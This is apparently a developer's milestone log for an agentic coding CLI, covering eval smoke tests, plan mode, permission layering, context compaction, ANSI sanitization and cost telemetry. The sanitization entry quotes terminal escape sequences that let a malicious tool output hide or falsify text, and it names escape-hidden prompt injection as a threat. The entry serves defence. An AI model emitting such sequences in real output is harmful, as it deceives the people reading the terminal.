     `defaults.mode: bypass` if neither layer supplied one (evals
     run autonomously, no operator to confirm; plan-mode block
     stays at the harness layer regardless).
  2. `bootstrap` with disabled enterprise/user policy paths
     (cwd-only project policy) and a per-case `AbortController`
     chained to the parent signal + a 60s timer.
  3. `runAgent` with `onEvent` hooked to record `tool_invoking`
     names and accumulate `text_delta` into a single output
     string. Cleanup of the cwd happens AFTER expectation
     evaluation so `file_*` checks see the post-run filesystem.
  4. `summarize` aggregates pass-rate, total cost, p50 cost.
- `src/evals/cli.ts` — `bun run src/evals/cli.ts <dir|file>`.
  Discovers `*.yaml` under a directory, runs cases sequentially,
  emits NDJSON per case + final summary on stdout, human progress
  on stderr (matches the spec §2.2 stdout-pure invariant).
  Returns 0 on full pass, 1 on any fail. Flags: `--model` (smoke
  defaults to whatever bootstrap default is), `--timeout-ms` per
  case.
- `package.json` — `eval:smoke` script wired to `evals/smoke`.
- `evals/smoke/*.yaml` — 7 cases:
  - `01-read-file` (read_file + output_contains the secret)
  - `02-create-file` (write_file + file_contains)
  - `03-edit-file` (edit_file on a fixture)
  - `04-grep-search` (grep with multi-file fixture)
  - `05-plan-mode-blocks-write` (plan + file_not_exists +
    output_contains "Plan")
  - `06-glob-search` (glob enumerates ts files)
  - `07-bash-readonly` (plan mode + bash with `head -n 1`,
    asserts plan-mode allows read-only bash via `planSafe`)
- `evals/fixtures/` — three reusable fixture trees referenced by
  the smoke cases.
- `tests/evals/loader.test.ts` + `tests/evals/executor.test.ts`
  — unit coverage with mock providers. 23 tests covering all
  expectation kinds, schema rejection paths, fixture/inline-file
  setup, plan-mode block behavior, and summary aggregation.

**Decisions:**

- **Real-model smoke is local-only for now, not CI.** Running
  smoke on every PR means an `ANTHROPIC_API_KEY` secret + real
  spend per PR and rate-limit pressure. The harness is ready for
  CI; promoting it waits until we have a baseline pass-rate from
  local runs and a budget envelope. Spec §16 calls for "roda em
  CI" — the cost gate is a dial, not a refusal.
- **Default policy is `bypass`, not `acceptEdits`.** Evals are
  autonomous tests; no human is there to answer prompts. Strict
  mode would dead-end every read_file/write_file/bash on the
  default-deny path. `acceptEdits` still default-denies unmatched
  paths — needs explicit allow rules per case. `bypass` is the
  right semantic for a smoke run; cases that want stricter
  policy drop their own `.agent/permissions.yaml` via setup.
  Plan mode stays orthogonal — it's a harness-layer block,
  unaffected by `bypass`.
- **8 expectation kinds, not the spec's `tests_pass`/
  `todo_used`.** `tests_pass` requires a test runner orchestrated
  inside the eval cwd; `todo_used` requires the `todo_write` tool
  (M3 per spec §18). Both deliberately deferred; the 8 we
  implemented cover M2's surface end-to-end.
- **Sequential execution, not parallel.** Each case opens its
  own SQLite DB inside its tmpdir, so concurrency is technically
  safe — but smoke is small (7 cases), parallel would make
  per-case cost prints interleave on stderr, and rate-limit
  pressure on a single API key is easier to reason about
  serially. Promote to parallel when bench tier (~500 cases)
  forces the issue.
- **Cleanup order matters for file_* assertions.** First version
  used a single `try { … } finally { rmSync(cwd) }` — and
  every `file_exists` assertion failed because cleanup ran
  before evaluation. Fixed by splitting: harness-cleanup
  (close DB, clear timer) in the inner finally, expectation
  evaluation immediately after, fs-cleanup last. Tests around
  `setup.files`/`setup.fixture` lock the order in.
- **Per-case YAML schema mirrors spec §16 with omissions
  explicit.** We support `setup.fixture`, `setup.files`,
  `prompt`, `expect`, `budget.maxSteps`, `budget.maxCostUsd`,
  `plan`. Spec also lists `tests_pass` and `todo_used` — those
  are valid YAML keys today (would parse) but will be rejected
  as unknown-kinds because `EXPECTATION_KEYS` doesn't list them.
  When M3 lands `todo_write` and a test-runner integration, add
  the kinds + assertions.
- **NDJSON on stdout, summary on stdout too.** The spec says
  stdout is for machine output. The summary line is also
  machine-consumable (`type: 'eval_summary'`); putting it on
  stdout means a `bun run eval:smoke | jq` pipeline gets both
  per-case and aggregate without parsing stderr. Human-readable
  summary lives on stderr alongside per-case progress.

**Pending (deferred to later milestones):**

- **CI integration.** Spec §16 wants "regrediu? PR bloqueado" —
  needs the smoke baseline + the secret + a CI workflow file.
  Schedule: after the first successful local smoke baseline.
- **Regression tier (~100 cases, < 10min).** Spec §16 says
  "todo PR." Authoring 100 cases is substantial and pre-supposes
  M3 features (todo_write, hooks). Land alongside M3.
- **Bench tier (~500 cases, weekly).** Same concern + multi-
  model comparison matrix per spec §16/PROVIDERS §7.
- **Multi-model first-class.** Today the runner takes a single
  `--model` flag. Multi-model eval is required for
  "provider-pluggable, não provider-parity" — needs per-tier
  threshold config, matrix output, and per-model registry
  pricing. M3+ alongside the second provider's stabilization.
- **Golden traces.** Spec calls for "comparação contra golden
  traces versionados." Pure-output assertions (output_contains)
  cover 80% of the value; full trace diffing waits until we
  have a stable serialization (likely M3+).

**Next (M2 closure):**

- M2 goal — "Robustez" — is structurally complete. Step 1
  (telemetry), Step 2 (compaction), Step 3 (sanitize), Step 4
  (permission hierarchy), Step 5 (plan mode), Step 6 (eval
  smoke) all in. M2 exit criterion (§18) — pass-rate ≥ 85% on
  smoke, p50 < $0.20 — needs a local baseline run against Haiku
  to verify; until then the harness is "ready, not yet
  measured." That measurement is the actual M2 sign-off.
- M3 starts after the baseline: subagents + worktree + MCP +
  resume + checkpoints + `/undo` + `bash_background` +
  `todo_write` + Repo Map.

---

## [2026-04-28] M2 / Step 5 — Plan mode (`--plan`)

`AGENTIC_CLI §5` calls plan mode "blocked at the harness level, not
in policy" — a read-only profile where the model produces a
structured plan instead of applying changes. Step 5 ships the
one-shot CLI version. Interactive `[a]ccept/[e]dit/[r]eject` review
flow needs the Ink UI and is deferred per the spec's plan→execute
section.

**Done:**
- `src/cli/args.ts` — `--plan` flag parsed alongside `--json`/etc.
  `ParsedArgs.plan: boolean` (default false). Usage line lists the
  flag.
- `src/harness/types.ts` — `HarnessConfig.planMode?: boolean`.
- `src/harness/invoke-tool.ts` — `InvokeToolDeps.planMode?: boolean`.
  When true and the resolved tool has `metadata.writes === true`,
  the call short-circuits BEFORE the permission engine and BEFORE
  any DB write. Returns a synthetic deny tool_result with a clear
  read-only message; no `tool_call` row, no `approval` row, no
  `execute()` invocation. Plan mode runs at the harness layer so
  even a session-policy override that allows writes can't subvert
  the read-only profile (spec invariant).
- `src/harness/loop.ts` — propagates `config.planMode` into
  `invokeTool` deps.
- `src/cli/bootstrap.ts` — `BootstrapInput.plan?: boolean`. When
  true, sets `config.planMode = true` AND injects
  `PLAN_MODE_SYSTEM_PROMPT` (markdown structure: Goal/Scope/Steps/
  Risks/Assumptions). Subset of the spec's full YAML schema —
  schema-validated output is M5+ when constrained generation lands.
- `src/cli/run.ts` — wires `args.plan` → `BootstrapInput.plan`.
  Prints `[plan mode] read-only run; write tools are blocked at the
  harness` to errSink before the run starts.

**Decisions:**
- **Harness-level block, not session-policy injection.** I considered
  injecting a session-layer policy with `deny_paths: ['**']` +
  `locked: true` for write tools — would reuse Step 4's lock
  semantics and feel cleaner. Rejected: (a) plan mode is profile,
  not policy — confusing two concepts undermines both; (b) spec is
  explicit ("blocked at the harness level, not policy"); (c) policy
  block has more moving parts (tool→category→section lookup) than a
  single `metadata.writes` check, more surface for the read-only
  invariant to drift; (d) harness-level block reads as `metadata.writes`
  — same predicate the checkpoint subsystem will use in M3 — keeping
  the concept centralized.
- **System prompt is markdown, not YAML schema.** Spec §5.1 lists
  the formal YAML schema for plan output. Without constrained
  generation (`generateConstrained` is M5), asking the model for
  YAML and parsing it loosely would produce occasional malformed
  output that callers couldn't reliably consume. Markdown is what
  the model produces naturally and the user can read directly;
  the YAML schema is an upgrade for when the constrained backend
  ships.
- **No interactive review.** Plan mode in M2 ends with the markdown
  on stdout (or NDJSON `text_delta` events) and exits. The spec's
  `[a]ccept/[e]dit/[r]eject` modal needs Ink components and a
  re-enter-run flow — both M3+. Single-shot plan still useful by
  itself: dirigir the CLI in big repos with confidence the run
  won't apply anything.
- **Plan-aware system prompt at bootstrap, not in the loop.**
  Bootstrap is where flag → config conversion happens; injecting
  there keeps the loop ignorant of plan mode beyond the
  `planMode` flag pass-through. Loop only consults the flag at
  the invokeTool propagation site.
- **Indicator on stderr regardless of `--json`.** Per spec §2.2,
  stdout in `--json` mode is NDJSON only; the plan-mode marker is
  operational metadata, not run output, so it goes to stderr where
  it doesn't pollute downstream pipes.
- **Per-tool `metadata.writes` is the source of truth.** Tools
  declare `writes: true` in their metadata (already the case for
  `write_file`, `edit_file`, `bash`). Plan mode reads from there;
  no parallel "list of write tools" to keep in sync.

**Tools with `writes: true` (blocked in plan mode):** `write_file`,
`edit_file`, `bash` (declared writes-true pessimistically per
CONTRACTS §2.6.3). Read-only tools (`read_file`, `glob`, `grep`)
proceed through the normal allow path.

**New tests (+10 over Step 4):**
- `tests/cli/args.test.ts` — 2: `--plan` flag set, default false.
  Usage line mentions `--plan`.
- `tests/cli/bootstrap.test.ts` — 2: plan:true → planMode + system
  prompt; plan omitted → both unset.
- `tests/cli/run.test.ts` — 1: `[plan mode]` indicator on errSink.
- `tests/harness/invoke-tool.test.ts` — 2: write tool denied
  before policy + DB (no execute, no toolCallId); read-only tool
  still executes normally in plan mode.
- `tests/harness/loop.test.ts` — 1: end-to-end runAgent with
  planMode + permissive policy + write tool_use → denied at
  harness, decision.kind === 'deny', execute never called.
- Total suite: **548 pass / 7 skip / 1215 expect() calls** in ~1.6s.

**Out of scope (deferred):**
- Interactive `<PlanReview>` modal with `[a]ccept/[e]dit/[r]eject` —
  M3 (needs Ink).
- Plan → run reentry with structured goal injection — M3.
- Schema-validated YAML output (`spec §5.1` formal schema) — M5
  (constrained generation backend).
- Plan-as-artifact persistence (`.agent/plans/<timestamp>.md`) —
  deferred; current model output goes to stdout, captured if user
  redirects.
- `acceptEdits` profile (third profile in §5.1) — separate step.
  acceptEdits is policy-mode (`PolicyMode.acceptEdits`) and already
  exists in the engine; CLI flag would just inject a session policy.

**Pending:** none for this step.

**Next:** M2 / Step 6 — Eval smoke. Final canonical M2 item per
spec §18. Minimal eval harness: 5-10 fixed tasks, executor that
runs `runAgent` against a real model, measures pass-rate + p50
cost. Critério de saída: pass-rate ≥85% smoke, p50 < $0.20/task.
Without it the rest of M2 is asserted-to-work without proof.

---

## [2026-04-28] M2 / Step 4 — Permission hierarchy

`AGENTIC_CLI §8` requires layered policy resolution: enterprise →
user → project → session. M1 only loaded `./.agent/permissions.yaml`,
leaving the higher and lower precedence tiers stubbed. Step 4 closes
that gap; trust prompt (the other half of M2 step 4 in the spec) is
deferred to `docs/TODO.md` because it depends on interactive UI that
hasn't landed yet.

**Done:**
- `src/permissions/paths.ts` — path discovery for each layer.
  `ENTERPRISE_POLICY_PATH = /etc/agent/permissions.yaml`. User path
  honors `XDG_CONFIG_HOME` (with empty-string fallback to
  `~/.config/agent/permissions.yaml`). Project path stays
  `cwd/.agent/permissions.yaml`.
- `src/permissions/hierarchy.ts` — `resolvePolicy({cwd, ...})` walks
  the four layers, loads each that exists, merges with locked-section
  semantics. Returns the effective `Policy`, the loaded
  `LayerPolicy[]` trail, and a `LockConflict[]` array describing any
  override attempts that were rejected.
- `src/permissions/types.ts` — added `locked?: boolean` to
  `PolicyDefaults`, `BashPolicy`, `PathPolicy`, `FetchPolicy`. Validator
  accepts and rejects non-boolean values.
- `src/permissions/config.ts` — `parsePolicy` round-trips `locked` on
  defaults and on each tool section.
- `src/cli/bootstrap.ts` — replaces the single-file `loadPolicyFromFile`
  call with `resolvePolicy`. New `BootstrapResult` shape: `policyLayers`
  (array of which layers contributed) + `lockConflicts` (warnings to
  surface). Test seams `enterprisePolicyPath`/`userPolicyPath` accept
  `null` to disable a layer entirely (avoid touching `/etc` in tests).
- `docs/TODO.md` — trust prompt deferral with rationale and pull-in
  signal.

**Merge semantics:**
- **Replace, not extend.** A lower-precedence layer that defines
  `tools.bash` fully replaces the higher layer's `tools.bash`.
  Predictable + matches most config systems; users who want to extend
  re-list everything. Spec stayed silent on this; replace is the safer
  choice for security policy (no surprise merges that allow more than
  the user intended).
- **Locked sections drop overrides + record conflicts.** Once any
  layer marks a section as `locked: true`, subsequent layers'
  attempts to redefine that section are silently dropped from the
  merged result and recorded in `lockConflicts` with
  `{section, lockedBy, attemptedBy}`. Caller (CLI run.ts) prints
  conflicts as warnings to stderr.
- **Same-value isn't a conflict.** A lower layer setting
  `defaults.mode: strict` when enterprise locked mode at `strict` is
  silently OK — only differing values trip the conflict log.

**New tests (+15 over Step 3):**
- `tests/permissions/paths.test.ts` — 5 cases: enterprise constant,
  XDG honored, XDG-empty falls back, ~/.config fallback, project path.
- `tests/permissions/hierarchy.test.ts` — 10 cases: discovery (no
  files, project only, three-layer precedence, session override),
  locked semantics (enterprise blocks user, enterprise blocks project,
  user blocks project, multi-layer conflict log, non-locked replace,
  same-value non-conflict).
- `tests/cli/bootstrap.test.ts` — updated to use `policyLayers`
  instead of removed `policySource` field; `enterprisePolicyPath: null`
  + `userPolicyPath: null` test seams pin that the test suite never
  touches `/etc/agent` or `~/.config/agent` during run.
- Total suite: **512 pass / 7 skip / 1132 expect() calls** in ~1.5s.

**Decisions:**
- **`enterprisePath: null` and `userPath: null` as test seams** rather
  than relying on `existsSync` returning false. Tests that don't
  actively use a layer set the path to `null` so the layer is
  guaranteed not to be probed. Catches the class of test bugs where
  a CI runner happens to have `/etc/agent/permissions.yaml` and the
  test silently picks it up.
- **`Policy` type ships `locked` as part of the schema**, not as a
  separate per-layer flag map. Round-trips through YAML; admins can
  inspect any layer's `locked` directly in the file without consulting
  a separate manifest.
- **All four layers use the same lock semantics**, not "only
  enterprise can lock". Spec language is "enterprise pode marcar
  regras como locked" (can mark) — doesn't preclude others. Uniform
  semantics are simpler and let user/project lock things from session
  too (think: a project locks its `tools.write_file.deny_paths`
  against runtime `--allow-write-everywhere` flags later).
- **`session` layer threads through `ResolveOptions.session`** rather
  than reading a separate config file. Session-layer config in M1 is
  only injected via tests / harness wiring; CLI flags adding to it is
  Step 5+ work.
- **`policyLayers` returns `('enterprise'|'user'|'project'|'session')[]`**
  instead of the old single `policySource: 'project'|'default'` enum.
  Multi-layer is now the norm; an empty array signals "no layer file
  found anywhere — engine falls back to default strict policy".

**Out of scope:**
- Trust prompt (deferred — see `docs/TODO.md`).
- `agent perms` introspection subcommand (would render `layers` and
  `lockConflicts` for the user). Cosmetic, lands when slash commands
  arrive in M3.
- CLI flag → session policy threading (`--allow`, `--deny`, etc).
  Session layer accepts injected policy today; binding flags to it
  is a later step.
- Windows path discovery (`%PROGRAMDATA%`, `%APPDATA%`). Linux/Mac
  only in M1/M2; same posture as `src/storage/paths.ts`.
- Multi-file policy in a layer (e.g., `~/.config/agent/permissions.d/*.yaml`).
  Single file per layer for now; conf.d-style fragments deferred.

**Pending:** none for this step.

**Next:** M2 / Step 5 — Plan mode (`--plan`). Read-only profile that
short-circuits all `writes: true` tools, asks the model to produce a
plan in markdown, exits without applying. Reuses the permissions
engine: a session-layer policy with `bypass`-style read tools and
deny-all writes. Useful for dirigirthe CLI in big repos with
confidence.

---

## [2026-04-28] M2 / Step 3 — Compaction

`AGENTIC_CLI.md §6` and `ORCHESTRATION.md §4` require the harness to
shrink conversation history when the prompt approaches the model's
context window. M1 sent the full history every turn; long sessions
would either burn cache hits or hit the cap. Step 1's telemetry
provides the trigger signal (per-turn prompt token count); Step 3
spends it.

**Done:**
- `src/harness/compaction.ts` — `compactMessages(provider, messages, options)`
  rewrites a `ProviderMessage[]` keeping the first user message
  (goal) and the last K turns literal, summarizing everything in
  between via an LLM call. Falls back to deterministic elision (drop
  `tool_result` bodies, replace with `[tool_result elided: N bytes]`
  pointers) when the LLM call fails. `temperature: 0` on the summary
  call so the same input compacts the same way across reruns.
- `src/harness/types.ts` — `RunBudget.compactionThreshold` (default
  `0.7`) and `compactionPreserveTail` (default `3`) per spec
  §4.1/§4.6. New `HarnessEvent` kinds `compaction_started` and
  `compaction_finished` carry threshold, prompt tokens, strategy
  (`'llm' | 'fallback' | 'skipped'`), folded count, duration, and
  reason. JSON renderer carries them through NDJSON automatically.
- `src/harness/loop.ts` — trigger check at the bottom of each loop
  iteration (after tool_results push, before the next request). Uses
  the LAST turn's `usage.input + cache_read + cache_creation` as a
  proxy for "size of the next request" — free signal, no extra
  countTokens HTTP call. Skips when telemetry was unavailable for
  the turn (`usageSeen=false`) since a guess could be very wrong.
  In-place rewrites the running `messages` array; the SQLite
  `messages` table stays intact so audit / replay can re-derive a
  different compaction policy later.
- Synthetic summary message uses `assistant` role with explicit
  `[compacted_history] ... [/compacted_history]` markers. Wrapper
  re-adds markers if the model forgets them so downstream scanners
  (recap, audit) can locate compacted blocks unambiguously.
- Fallback path emits a synthetic note describing strategy + reason,
  followed by the original middle messages with `tool_result` bodies
  elided. Pointer string includes original byte size and points to
  the audit log so a forensics user can recover the body.

**New tests (+11 over Step 2):**
- `tests/harness/compaction.test.ts` — 8 cases:
  - LLM happy path: goal + tail preserved, middle replaced with one
    summary message.
  - Marker re-injection when the model returns prose without them.
  - Summary request shape: `temperature: 0`, configurable `maxTokens`,
    compaction system prompt instead of the run's.
  - History too short → `strategy: 'skipped'`, no provider call.
  - LLM throw → `strategy: 'fallback'`, original middle preserved
    with `tool_result` content elided.
  - Stream-only errors → fallback (no useful summary).
  - Empty summary text → fallback.
  - Aborted signal → fallback (the abort reaches the LLM call via
    `abortableIterable`).
- `tests/harness/loop.test.ts` — 3 cases:
  - Trigger fires when `prompt_tokens > threshold × context_window`;
    `compaction_started` and `compaction_finished` events emit;
    post-compaction request reaches the provider with shorter
    `messages.length`.
  - Below threshold → no event.
  - `usageSeen=false` → no event (can't guess size honestly).
- Total suite: **459 pass / 7 skip / 1016 expect() calls** in ~1.5s.

**Decisions:**
- **Trigger signal is the LAST turn's billed prompt tokens**, not a
  pre-flight `countTokens` call. `countTokens` would be a free-cost
  HTTP roundtrip on Anthropic and a heuristic on OpenAI; reusing
  telemetry already collected is exact (for the request that just
  ran) and zero-cost. The next request is "this history + freshly
  appended tool_results" — strictly larger than what we measured —
  so a turn ≥70% guarantees the next ≥70%. Slightly eager but
  always correct in the safe direction (trigger before we hit the
  cap, never after).
- **Skip when `usageSeen=false`.** Compat endpoints that drop usage
  telemetry leave us blind to the actual prompt size. Guessing
  (chars/4 heuristic over the messages) could be wildly off and
  trigger needless compactions. The conservative call is to skip;
  the user's `~$X.XX (incomplete)` cost indicator already signals
  the missing telemetry.
- **In-memory only — no DB rewrite.** `messages` table keeps every
  original turn. Compaction only mutates the running provider array.
  Replay can re-decide whether to compact or take the long path.
  Avoids an "atomic mid-session DB rewrite" mechanism that would
  multiply the test surface for marginal gain in M2.
- **Same provider as the run for the summary call.** Spec §4.5
  recommends a cheaper model per profile (Haiku for autonomous
  Anthropic). Selecting the cheap model requires a registry-aware
  policy that we'll add when we have profile abstractions in M3+.
  For now, using the run's provider keeps the integration tight
  and lets users override via the registry.
- **Summary inserted as `assistant` role, not `user`.** Two
  consecutive `user` messages would also be valid (Anthropic accepts),
  but presenting the summary as the agent's own context note keeps
  the next turn's user/assistant alternation obvious to the model
  reading the prompt.
- **Fallback preserves the middle messages with elided
  `tool_result` content** rather than collapsing to a single note.
  Tool_use blocks reference IDs the next turn might still cite;
  preserving the structure (with bodies replaced by pointers) keeps
  those references resolvable. Pointer carries original byte size
  so a verbose-mode user knows the magnitude of what was dropped.
- **Marker re-injection on missing markers.** Tests pin that the
  wrapper re-adds `[compacted_history]...[/compacted_history]` when
  the model forgets — drift in the model's structured-output
  adherence shouldn't break downstream scanners.

**Out of scope (deferred):**
- `PreCompact` hook — requires hooks subsystem (M4).
- Pinned context (`CONTEXT_TUNING.md §12.4`) — needs the slash
  command surface and the user-facing pin/unpin UX.
- Goal re-injection literal (`§4.2 step "Goal re-injection literal +
  pinned context"`) — currently the goal IS preserved as message[0]
  but isn't re-injected into the system prompt. Lands when system
  prompt architecture (`CONTEXT_TUNING.md §1`) is implemented.
- Schema-validated compaction output with retry — depends on
  constrained generation backend (M5) for reliable structured
  decoding. Current loose-text approach is acceptable while we
  monitor adherence in eval.
- Per-profile cheap-model selection (`§4.5`) — requires profile +
  model-registry policy plumbing (M3+).
- DB persistence of compaction events / `compaction_runs` table —
  current `onEvent` callback is enough for M2 observability;
  formal audit table lands with the rest of the audit subsystem.
- Atomic SQLite transaction around compaction — only relevant when
  we DO persist the rewrite (deferred above).
- `evals/compaction/static_fallback/` corpus — bound to the evals
  smoke step.
- Truncation tier (oldest assistant turns head+tail) when fallback
  is still > threshold (`§4.6` step 6) — current fallback drops
  bodies; size-bounded follow-up is M2 later step.

**Pending:** none for this step.

**Next:** M2 / Step 4 — Trust prompt + permission hierarchy. New
directory / unknown `AGENTS.md` requires confirmation; merge
enterprise → user → project → session policy resolution. Fixes a
gap from M1 where `./.agent/permissions.yaml` was the only source.

---

## [2026-04-28] M2 / Step 2 — Output sanitization (ANSI strip)

`SECURITY_GUIDELINE.md §3.2` (line 161) and §5 invariant 4 require a
sanitization layer between tool execution and the model context. M1
left the gap explicit; Step 2 closes it.

**Threat covered:**
- A tool returning `\x1b[2K\x1b[1AOK: file empty` lets a malicious
  file lie about what happened when its output is later echoed in a
  terminal (verbose mode, audit replay, recap renderer).
- Tools embedding OSC sequences (`\x1b]0;title\x07`) can hijack the
  terminal title or, with OSC 8, inject deceptive hyperlinks.
- Token waste: ANSI bytes in the model's context inflate input cost
  with bytes the model can't render.
- Prompt-injection vector: text hidden inside escape blocks.

**Done:**
- `src/sanitize/ansi.ts` — `stripAnsi(s)` removes CSI (`\x1b[...`),
  OSC with both BEL and ST terminators, DCS/APC/PM/SOS, 7-bit
  single-char escapes (range 0x40-0x7E covering Type Fe + Fs + RIS),
  and 8-bit C1 controls (0x80-0x9F). Alternation order matches
  structured patterns first, so a malformed `\x1b[123;` falls
  through to the single-char rule (eats just `\x1b[`, leaves `123;`
  as text — leaving live ESC bytes is the security risk).
- `src/sanitize/ansi.ts` — `sanitizeToolOutput(value)` recursively
  walks objects and arrays, stripping ANSI from every string leaf
  while preserving shape, primitives, and discriminator booleans
  (`is_error: true` on `ToolError` survives intact). Cycle detection
  via `WeakSet` replaces revisited references with `<cycle>`; tool
  outputs shouldn't contain cycles, but a buggy input must not
  stack-overflow.
- `src/harness/invoke-tool.ts` — sanitizes the tool result once,
  before both sinks: the audit row (`finishToolCall(... output ...)`)
  and the model-facing `tool_result` block. ToolError messages also
  pass through (a subprocess crashing with colored stderr won't
  smuggle escape bytes into either path).

**New tests (+18 over Step 1):**
- `tests/sanitize/ansi.test.ts` — 12 cases: SGR colors, cursor/erase
  (the canonical "rewrite history" pattern), OSC with both
  terminator styles, DCS/APC, single-char escapes, C1 bytes,
  preservation of plain text and whitespace, malformed CSI handling,
  consecutive sequences. Plus 9 `sanitizeToolOutput` cases: nested
  walk, non-string preservation, cyclic objects, cyclic arrays,
  ToolError discriminator, no-mutation guarantee.
- `tests/harness/invoke-tool.test.ts` — 2 new: ANSI stripped from
  both `tool_result.content` and persisted `tool_calls.output`;
  ANSI in `ToolError.error_message` also stripped. Hard guarantee:
  `JSON.stringify(tc?.output)` contains no `\x1b` byte.
- Total suite: **444 pass / 7 skip / 959 expect() calls** in ~1.4s.

**Decisions:**
- **Sanitize at the harness, not the tool layer.** Universal policy
  beats per-tool opt-in: no future tool can forget to strip. The
  sanitizer runs once and feeds both the audit row and the
  `tool_result` block, so neither path can drift.
- **Strip everything, don't preserve SGR.** The spec language
  ("preservar SGR seguro") targets terminal renderers. For tool
  output flowing to the MODEL there's no terminal — colors are
  noise. A future verbose/interactive renderer that wants to display
  tool output to the user can re-decide at its own layer with its
  own safe-SGR allowlist (renderer side, against text we already
  scrubbed at intake).
- **Recursive walker, not flat string strip.** Tools return
  structured objects (`{stdout, stderr, exit_code}`). Walking
  preserves shape so the model gets `{stdout: "error: real", ...}`
  instead of a re-stringified blob.
- **Cycle marker is `<cycle>`** rather than throwing or silently
  dropping the branch. Tool contract is JSON-shaped (no cycles in
  practice), but a buggy input mustn't stack-overflow; the marker
  keeps the path navigable.
- **Malformed CSI strips just `\x1b[`** instead of leaving the ESC
  byte. The conservative direction is "remove control bytes
  aggressively, leave printable text alone" — orphan params (`123;`)
  in output are harmless noise; live ESC bytes are the security risk.
- **No `--include-tool-output` raw escape hatch yet.** Spec §1.4
  mentions one for future verbose mode. Deferred until M2 has a
  verbose-output path that needs it; the audit row will hold raw
  bytes only when explicitly opted in (and re-stripped before
  re-display).
- **`stripAnsi` keeps `\t \n \r`.** Whitespace bytes are part of
  legitimate text content; only escape sequences are control bytes
  for sanitization purposes.

**Out of scope:**
- Renderer-side SGR allowlist for verbose mode (M2 later step or M3)
- Secret redaction (`SECURITY_GUIDELINE.md §6` — separate layer)
- Injection heuristic with `injection_suspect: true` flag
  (`SECURITY_GUIDELINE.md §9.1.5` — bound to `fetch_url` policy work)
- Real-shell ANSI fixture corpus from `evals/` (deferred to evals
  smoke step)

**Pending:** none for this step.

**Next:** M2 / Step 3 — Compaction. Sliding-window history +
Haiku-driven summarization when context approaches the model's cap.
The Step 1 telemetry tells the harness when to trigger; this step
spends those numbers.

---

## [2026-04-28] M2 / Step 1 — Telemetry: usage tokens + cost tracking

Opens M2 ("Robustez"). Pre-requisite for compaction (need to know when to
trigger) and eval smoke (need cost numbers). Without it, the CLI is flying
blind on production runs.

**Done:**
- `src/providers/types.ts` — new `UsageInfo` (`input` / `output` / `cache_read` / `cache_creation`) and a canonical `kind: 'usage'` `StreamEvent` between the last content event and `stop` in every well-formed turn.
- `src/providers/anthropic/stream.ts` — extracts usage from `message_start.message.usage` (input + cache_read + cache_creation) and from the final `message_delta.usage` (output). Both shapes optional in `RawAnthropicEvent` so older SDK responses still parse. Defaults to zero when the SDK omits it.
- `src/providers/openai/stream.ts` — reads `chunk.usage` from the final chunk (only present when `stream_options.include_usage` is set). Splits `prompt_tokens` minus `prompt_tokens_details.cached_tokens` so `input` semantics match Anthropic (non-cached tokens at full rate, cache_read at the discount tier).
- `src/providers/openai/index.ts` — opts into `stream_options: { include_usage: true }` on every `chat.completions.create`. Falls back to a zeroed UsageInfo when compatibility endpoints (Azure, OpenRouter) ignore the flag.
- `src/providers/google/stream.ts` — reads `chunk.usageMetadata` (cumulative; last chunk wins). Same `prompt − cached` split. `cache_creation` stays zero (Gemini's cache is pre-warmed via a separate API; the stream never reports writes).
- `src/providers/cost.ts` — `computeCost(caps, usage)` honors the four-tier rate table (`input`, `output`, `cache_read`, `cache_creation`); falls back to the raw input rate when `cost_per_1k_cached_input` or `cost_per_1k_cache_write` aren't declared. `addUsage` + `emptyUsage` for accumulation.
- `src/storage/migrations/003-usage-cost.ts` — `ALTER TABLE messages ADD COLUMN cache_creation_tokens INTEGER` + `ADD COLUMN cost_usd REAL`. The original schema had `cached_tokens` (reads) but no separate write column; cost_usd avoids re-deriving pricing every time `agent audit costs` runs.
- `src/storage/repos/messages.ts` — `Message` carries `cacheCreationTokens` / `costUsd`; `appendMessage` accepts and persists them.
- `src/harness/collect.ts` — `CollectedStep.usage` accumulated from `kind: 'usage'` events. Last event wins (defensive for adapters that ever split the report).
- `src/harness/loop.ts` — every assistant turn writes `tokens_in` / `tokens_out` / `cached_tokens` / `cache_creation_tokens` / `cost_usd` to `messages`. Session-wide totals (`totalUsage`, `totalCostUsd`) accumulate across turns, persist via `completeSession(..., totalCostUsd)` (the column already existed but was always written as `0`), and surface in `HarnessResult.usage` + `HarnessResult.costUsd`.
- `src/harness/types.ts` — `HarnessResult` exposes `usage: UsageInfo` and `costUsd: number`. `session_finished` HarnessEvent reuses `result`, so renderers see the totals without a new event shape.
- `src/cli/output/plain.ts` — final summary line now reads `[done/done] N steps · Mms · tokens IN/OUT[ (cache_r X, cache_w Y)] · $0.XXXX`. Cache columns elided when zero so OpenAI/Gemini users don't get noise.
- `src/cli/output/json.ts` — unchanged; passes `session_finished` through and `result.usage` / `result.costUsd` ride along automatically. New test pins the NDJSON shape.

**New tests (+62 over M1):**
- `tests/providers/cost.test.ts` — 9 cases: empty usage, input/output composition, cached_input rate honored, fallback to input rate when cached_input undeclared, cache_write rate honored, fallback for cache_creation, all-four composition, addUsage commutativity.
- `tests/providers/anthropic-stream.test.ts` — 2 new: usage extracted from message_start + message_delta with cache splits; zeroed usage event when SDK omits the payload.
- `tests/providers/openai-stream.test.ts` — 1 new: cached_tokens split out of prompt_tokens (matches Anthropic semantics).
- `tests/providers/google-stream.test.ts` — 1 new: cachedContentTokenCount split out of promptTokenCount.
- `tests/harness/loop.test.ts` — 3 new: aggregates usage across turns + persists to `sessions.total_cost_usd`; per-message tokens + cost on assistant rows; `session_finished` event carries the same usage/cost as the result.
- `tests/cli/output-plain.test.ts` — 1 new: summary shows cache columns when non-zero; existing summary tests updated to assert `tokens N/M` + `$0.XXXX`.
- `tests/cli/output-json.test.ts` — assert NDJSON `session_finished` line contains `result.usage.input` and `result.costUsd`.
- All 3 stream test files gained a `collectNonUsage` helper so the existing exact-sequence assertions (~30 tests) didn't need a `usage` event boilerplate — only the dedicated usage tests use raw `collect`.
- Total suite: **396 pass / 7 skip / 867 expect() calls** in ~1.4s.

**Decisions:**
- **`usage` is its own canonical `StreamEvent` kind**, not a field tacked onto `stop`. Adapters emit it once per turn between the last content event and `stop`; `collectStep` accumulates it independently. Tying usage to `stop` would force every test that asserts a `stop` shape to know about usage; making it its own event lets renderers / collectors choose to ignore it.
- **`prompt_tokens − cached_tokens` split for OpenAI/Gemini** at the adapter, not the cost computer. OpenAI's `prompt_tokens` is the *full* prompt count including cache hits; Anthropic's `input_tokens` is *non-cached only*. Normalizing to Anthropic's semantics here means `computeCost` doesn't need a per-provider branch — it just multiplies by the declared rate.
